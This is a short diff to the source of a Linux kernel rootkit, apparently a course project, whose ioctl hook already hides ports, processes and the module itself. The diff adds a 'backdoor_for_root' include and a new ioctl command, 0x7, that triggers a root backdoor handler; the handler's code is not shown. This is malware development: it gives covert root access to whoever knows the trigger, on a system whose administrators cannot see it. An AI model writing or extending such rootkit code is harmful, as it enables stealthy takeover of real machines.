@@ -12,6 +12,7 @@
 #include "port_hiding/port_hiding.h"
 #include "process_hiding/process_hiding.h"
 #include "process_protection/process_protection.h"
+#include "backdoor_for_root/backdoor_for_root.h"
 
 MODULE_AUTHOR("RuanJianAnQuanYuanLiDiQiZu");
 
@@ -78,6 +79,10 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long
             case 0x6:
                 // module unhiding
                 unhide_module();
+                break;
+            case 0x7:
+                // backdoor_for_root
+                handle_backdoor_root_request();
                 break;
             default:
                 // not valid
